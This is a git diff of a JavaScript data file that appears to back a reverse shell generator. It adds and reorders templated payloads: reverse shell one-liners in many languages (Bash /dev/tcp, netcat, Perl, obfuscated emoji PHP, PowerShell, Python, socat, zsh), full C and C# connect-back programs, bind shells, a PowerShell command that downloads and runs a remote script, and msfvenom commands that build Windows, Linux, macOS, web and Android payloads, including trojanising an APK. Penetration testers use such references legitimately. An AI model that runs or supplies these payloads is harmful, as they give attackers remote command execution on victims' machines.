@@ -18,8 +18,7 @@ const rsgData = {
         'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
     },
 
-    reverseShellCommands: [
-        {
+    reverseShellCommands: [{
             "name": "Bash -i",
             "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
             "meta": ["linux", "mac"]
@@ -45,16 +44,6 @@ const rsgData = {
             "meta": ["linux", "mac"]
         },
         {
-            "name": "C",
-            "command": "#include &lt;stdio.h>\n#include &lt;sys/socket.h>\n#include &lt;sys/types.h>\n#include &lt;stdlib.h>\n#include &lt;unistd.h>\n#include &lt;netinet/in.h>\n#include &lt;arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execve(\"{shell}\", argv, NULL);\n\n    return 0;       \n}",
-            "meta": ["linux", "windows", "mac"]
-        },
-        {
-            "name": "C#",
-            "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"10.0.2.15\", 443))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
-            "meta": ["linux", "windows", "mac"]
-        },
-        {
             "name": "nc mkfifo",
             "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
             "meta": ["linux", "mac"]
@@ -62,17 +51,27 @@ const rsgData = {
         {
             "name": "nc -e",
             "command": "nc -e {shell} {ip} {port}",
-            "meta": ["linux", "windows", "mac"]
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "nc.exe -e",
+            "command": "nc -e {shell} {ip} {port}",
+            "meta": ["windows"]
         },
         {
             "name": "nc -c",
             "command": "nc -c {shell} {ip} {port}",
-            "meta": ["linux", "windows", "mac"]
+            "meta": ["linux", "mac"]
         },
         {
             "name": "ncat -e",
-            "command": "ncat {ip} {port} -e {shell} ",
+            "command": "ncat {ip} {port} -e {shell}",
             "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ncat.exe -e",
+            "command": "ncat.exe {ip} {port} -e {shell}",
+            "meta": ["windows"]
         },
         {
             "name": "ncat udp",
@@ -80,19 +79,35 @@ const rsgData = {
             "meta": ["linux", "mac"]
         },
         {
-            "name": "Emoji PHP",
-            "command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{ip}\";$💻 = {port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
+            // fix
+            "name": "C",
+            "command": "#include &lt;stdio.h>\n#include &lt;sys/socket.h>\n#include &lt;sys/types.h>\n#include &lt;stdlib.h>\n#include &lt;unistd.h>\n#include &lt;netinet/in.h>\n#include &lt;arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execve(\"{shell}\", argv, NULL);\n\n    return 0;       \n}",
             "meta": ["linux", "windows", "mac"]
+        },
+        {
+            "name": "C#",
+            "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"10.0.2.15\", 443))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
+            "meta": ["linux", "windows"]
+        },
+        {
+            "name": "Haskell #1",
+            "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
+            "meta": ["linux", "mac"]
         },
         {
             "name": "Perl",
             "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
-            "meta": ["linux", "windows", "mac"]
+            "meta": ["linux", "mac"]
         },
         {
             "name": "Perl no sh",
             "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{port}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
-            "meta": ["linux", "windows", "mac"]
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "PHP Emoji",
+            "command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{ip}\";$💻 = {port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
+            "meta": ["linux", "mac"]
         },
         {
             "name": "PHP PentestMonkey",
@@ -108,7 +123,7 @@ const rsgData = {
         {
             "name": "PHP exec",
             "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
-            "meta": ["linux",, "mac"]
+            "meta": ["linux", , "mac"]
         },
         {
             "name": "PHP shell_exec",
@@ -118,7 +133,7 @@ const rsgData = {
         {
             "name": "PHP system",
             "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
-            "meta": ["linux", "mac"]
+            "meta": ["linux", "windows", "mac"]
         },
         {
             "name": "PHP passthru",
@@ -138,91 +153,172 @@ const rsgData = {
         {
             "name": "Windows ConPty",
             "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
-            "meta": []
+            "meta": ["windows"]
         },
         {
             "name": "PowerShell #1",
             "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
-            "meta": []
+            "meta": ["windows"]
         },
         {
             "name": "PowerShell #2",
             "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
-            "meta": []
+            "meta": ["windows"]
         },
         {
             "name": "PowerShell #3 (Base64)",
-            "meta": []
+            "meta": ["windows"]
         },
         {
             "name": "Python #1",
             "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "Python #2",
             "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
-            "meta": []
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "Python3 #1",
+            "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "Python3 #2",
+            "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+            "meta": ["linux", "mac"]
         },
         {
             "name": "Ruby #1",
             "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "Ruby no sh",
             "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "socat #1",
             "command": "socat TCP:{ip}:{port} EXEC:{shell}",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "socat #2 (TTY)",
             "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
-            "meta": []
-        },
-        {
-            "name": "awk",
-            "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "node.js",
             "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "Java #1",
             "command": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class shell {\n    public static void main(String args[]) {\n        String s;\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
-            "meta": []
-        },
-        {
-            "name": "Haskell #1",
-            "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
             "name": "telnet",
             "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
-            "meta": []
+            "meta": ["linux", "mac"]
         },
         {
-            // testing.. need to move into MSFVenom. Another aray...?
-            "name": "Windows Meterpreter Staged Reverse TCP",
-            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
-            "meta": ["msfvenom", "windows", "meterpreter", "reverse"]
+            "name": "zsh",
+            "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+            "meta": ["linux", "mac"]
         },
     ],
 
-    // msfvenom: [{
-    //         "name": "Windows Meterpreter Staged Reverse TCP",
-    //         "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -f exe > reverse.exe",
-    //         "meta": ["msfvenom", "windows", "meterpreter", "reverse"]
-    //     },
+    bindShellCommands: [{
+        "name": "Perl Bind",
+        "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'",
+        "meta": ["bind"]
+    },
+    {
+        "name": "Python3 Bind",
+        "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
+        "meta": ["bind"]
+    },
+    {
+    "name": "PHP Bind",
+    "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\socket_write($cl,$m,strlen($m));}}'",
+    "meta": ["bind"]
+    },
+],
 
-    // ],
+    msfvenomShellCommands: [{
+        "name": "Windows Meterpreter Staged Reverse TCP",
+        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
+        "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
+    },
+    {
+        "name": "Windows Stageless Reverse TCP",
+        "command": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
+        "meta": ["msfvenom", "windows", "stageless", "reverse"]
+    },
+    {
+        "name": "Linux Meterpreter Staged Reverse TCP",
+        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
+        "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
+    },
+    {
+        "name": "Linux Stageless Reverse TCP",
+        "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
+        "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
+    },
+    {
+        "name": "Linux Meterpreter Staged Reverse TCP (x86)",
+        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
+        "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
+    },
+    {
+        "name": "macOS Stageless Reverse TCP (x86)",
+        "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho > shell.macho",
+        "meta": ["msfvenom", "mac", "stageless", "reverse"]
+    },
+    {
+        "name": "PHP Meterpreter Stageless Reverse TCP",
+        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php",
+        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
+    },
+    {
+        "name": "JSP Stageless Reverse TCP",
+        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
+        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
+    },
+    {
+        "name": "WAR Stageless Reverse TCP",
+        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
+        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
+    },
+    {
+        "name": "Android Meterpreter Reverse TCP",
+        "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > payload-name.apk",
+        "meta": ["msfvenom", "android", "android", "reverse"]
+    },
+    {
+
+        "name": "Android Meterpreter Embed Reverse TCP",
+        "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
+        "meta": ["msfvenom", "android", "android", "reverse"]
+    },
+    {
+        "name": "Python Stageless Reverse TCP",
+        "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell.py",
+        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
+    },
+    {
+        "name": "Bash Stageless Reverse TCP",
+        "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw > shell.sh",
+        "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
+    },
+    {
+        "name": "Perl Stageless Reverse TCP",
+        "command": "msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw > shell.pl",
+        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
+    },
+],
 
 }
